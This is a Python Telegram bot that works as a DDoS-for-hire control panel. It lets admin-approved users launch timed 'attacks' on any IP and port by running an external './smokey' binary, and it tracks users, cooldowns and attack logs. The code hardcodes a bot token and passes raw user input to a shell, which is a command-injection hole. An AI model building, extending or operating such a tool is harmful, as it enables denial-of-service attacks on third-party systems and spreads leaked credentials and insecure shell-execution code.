import telebot
import subprocess
import datetime
import os
import time
import threading
from threading import Lock

# Initialize bot
bot = telebot.TeleBot('7623804344:AAEQXxUg9DAlaO-NI8xjcho7ml0NxAN0yA0')

# Admin configuration
admin_id = {"6284940908"}  # Your admin user ID
USER_FILE = "users1.txt"
LOG_FILE = "command_logs.txt"
FREE_USER_FILE = "free_users.txt"
free_user_credits = {}

# Thread-safe data structures
allowed_user_ids = []
users_lock = Lock()
active_attacks = {}
soul_cooldown = {}

# Initialize cooldown period
COOLDOWN_TIME = 0

def read_users():
    global allowed_user_ids
    try:
        with users_lock:
            with open(USER_FILE, "r") as file:
                allowed_user_ids = file.read().splitlines()
    except FileNotFoundError:
        allowed_user_ids = []
        # Create the file if it doesn't exist
        with open(USER_FILE, "w") as file:
            pass

def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
    except FileNotFoundError:
        pass

def save_users():
    with users_lock:
        with open(USER_FILE, "w") as file:
            file.write("\n".join(allowed_user_ids))

def record_command_logs(user_id, command, target, port, duration):
    with open(LOG_FILE, "a") as file:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"[{timestamp}] UserID: {user_id} Command: {command} Target: {target} Port: {port} Duration: {duration}\n")

def log_command(user_id, target, port, duration):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] User {user_id} attacked {target}:{port} for {duration} seconds\n"
    with open("attack_logs.txt", "a") as file:
        file.write(log_message)

# Initialize user data
read_users()
read_free_users()

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    help_text = """
    🤖 Bot Commands:
    
    /id - Get your user ID
    /la <IP> <PORT> <TIME> - Launch attack
    /mylogs - View your attack logs
    /add <userid> - (Admin) Add user
    /remove <userid> - (Admin) Remove user
    /list - (Admin) List all users
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "🚫 You don't have admin privileges!")
        return

    try:
        command = message.text.split()
        if len(command) < 2:
            bot.reply_to(message, "❌ Usage: /add <userid>")
            return

        user_to_add = command[1].strip()
        
        if not user_to_add.isdigit():
            bot.reply_to(message, "❌ User ID must contain only numbers!")
            return
            
        with users_lock:
            if user_to_add in allowed_user_ids:
                bot.reply_to(message, "⚠️ User already exists!")
                return
                
            allowed_user_ids.append(user_to_add)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_add}\n")
                
        bot.reply_to(message, f"✅ User {user_to_add} added successfully!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "🚫 You don't have admin privileges!")
        return

    try:
        command = message.text.split()
        if len(command) < 2:
            bot.reply_to(message, "❌ Usage: /remove <userid>")
            return

        user_to_remove = command[1].strip()
        
        with users_lock:
            if user_to_remove not in allowed_user_ids:
                bot.reply_to(message, "⚠️ User not found in the list!")
                return
                
            allowed_user_ids.remove(user_to_remove)
            save_users()
            
        bot.reply_to(message, f"✅ User {user_to_remove} removed successfully!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['list'])
def list_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "🚫 You don't have admin privileges!")
        return

    try:
        with users_lock:
            if not allowed_user_ids:
                bot.reply_to(message, "ℹ️ No users in the database.")
                return
                
            users_list = "\n".join(allowed_user_ids)
            bot.reply_to(message, f"📋 Authorized Users:\n{users_list}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"🆔 Your ID: {message.chat.id}")

def update_attack_message(chat_id, message_id, target, port, total_time, remaining_time):
    try:
        if remaining_time > 0:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"🔥 ATTACK IN PROGRESS 🔥\n\nTarget: {target}\nPort: {port}\nTime remaining: {remaining_time}s\nMethod: Free"
            )
            threading.Timer(1.0, update_attack_message, 
                          args=[chat_id, message_id, target, port, total_time, remaining_time-1]).start()
        else:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"✅ ATTACK COMPLETED ✅\n\nTarget: {target}\nPort: {port}\nDuration: {total_time}s\nMethod: Free"
            )
            if chat_id in active_attacks:
                del active_attacks[chat_id]
    except Exception as e:
        print(f"Error updating attack message: {e}")

@bot.message_handler(commands=['la'])
def handle_soul(message):
    user_id = str(message.chat.id)
    
    # Check authorization
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "🔒 Access denied!")
        return
        
    # Check cooldown for non-admins
    if user_id not in admin_id:
        current_time = datetime.datetime.now()
        if user_id in soul_cooldown and (current_time - soul_cooldown[user_id]).seconds < COOLDOWN_TIME:
            remaining = COOLDOWN_TIME - (current_time - soul_cooldown[user_id]).seconds
            bot.reply_to(message, f"⏳ Cooldown active. Please wait {remaining} seconds.")
            return
        soul_cooldown[user_id] = current_time
    
    # Parse command
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "❌ Usage: /la <IP> <PORT> <TIME>")
            return
            
        target = parts[1]
        port = parts[2]
        duration = int(parts[3])
        
        if duration > 300:
            bot.reply_to(message, "❌ Maximum attack time is 300 seconds!")
            return
            
        # Check for existing attack
        if message.chat.id in active_attacks:
            bot.reply_to(message, "⚠️ You already have an active attack!")
            return
            
        # Start attack
        def run_attack():
            try:
                subprocess.run(f"./smokey {target} {port} {duration} 599", shell=True, check=True)
            except Exception as e:
                print(f"Attack error: {e}")
        
        # Record and log
        record_command_logs(user_id, '/la', target, port, duration)
        log_command(user_id, target, port, duration)
        
        # Start attack in thread
        attack_thread = threading.Thread(target=run_attack)
        attack_thread.start()
        
        # Start timer display
        msg = bot.reply_to(message, f"🔥 ATTACK STARTED 🔥\n\nTarget: {target}\nPort: {port}\nTime remaining: {duration}s\nMethod: Free")
        
        active_attacks[message.chat.id] = {
            'target': target,
            'port': port,
            'total_time': duration,
            'message_id': msg.message_id
        }
        
        update_attack_message(
            message.chat.id,
            msg.message_id,
            target,
            port,
            duration,
            duration-1
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "🔒 Access denied!")
        return
        
    try:
        if not os.path.exists(LOG_FILE):
            bot.reply_to(message, "ℹ️ No logs available yet.")
            return
            
        with open(LOG_FILE, "r") as file:
            user_logs = [line for line in file.readlines() if f"UserID: {user_id}" in line]
            
        if not user_logs:
            bot.reply_to(message, "ℹ️ No logs found for your account.")
            return
            
        logs_text = "📜 Your Attack Logs:\n" + "".join(user_logs[-10:])  # Show last 10 logs
        bot.reply_to(message, logs_text)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error accessing logs: {str(e)}")

if __name__ == '__main__':
    print("Bot started...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(10)
